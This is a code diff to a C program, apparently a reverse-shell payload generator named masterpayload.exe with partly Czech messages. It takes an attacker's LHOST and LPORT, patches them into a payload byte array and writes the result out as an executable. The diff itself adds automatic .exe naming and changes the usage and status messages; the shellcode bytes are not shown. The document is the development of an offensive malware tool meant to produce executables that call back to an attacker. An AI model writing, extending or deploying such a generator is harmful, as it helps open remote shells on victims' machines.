@@ -7,7 +7,7 @@
 #pragma comment(lib, "ws2_32.lib")
 
 void usage() {
-    printf("Usage: masterpayload.exe LHOST=(IP) LPORT=(port) --write name.exe\n");
+    printf("Usage: masterpayload.exe LHOST=(IP) LPORT=(port) --write name\n");
 }
 
 void generate_payload(const char *lhost, const char *lport, const char *output_file) {
@@ -32,8 +32,16 @@ void generate_payload(const char *lhost, const char *lport, const char *output_f
     final_payload[21] = (unsigned char)((port >> 8) & 0xFF);
     final_payload[22] = (unsigned char)(port & 0xFF);
 
+    // Add .exe extension if not provided
+    char final_filename[256];
+    if (strstr(output_file, ".exe") == NULL) {
+        snprintf(final_filename, sizeof(final_filename), "%s.exe", output_file);
+    } else {
+        snprintf(final_filename, sizeof(final_filename), "%s", output_file);
+    }
+
     // Create the file to save the payload
-    FILE *file = fopen(output_file, "wb");
+    FILE *file = fopen(final_filename, "wb");
     if (file == NULL) {
         perror("Error creating file");
         return;
@@ -42,7 +50,7 @@ void generate_payload(const char *lhost, const char *lport, const char *output_f
     fwrite(final_payload, 1, sizeof(final_payload), file);
     fclose(file);
 
-    printf("[*] Payload generován! S LHOSTEM %s a LPORTEM %s !\n", lhost, lport);
+    printf("[*] Payload generován! S LHOSTEM %s a LPORTEM %s, saved as %s\n", lhost, lport, final_filename);
 }
 
 int main(int argc, char *argv[]) {
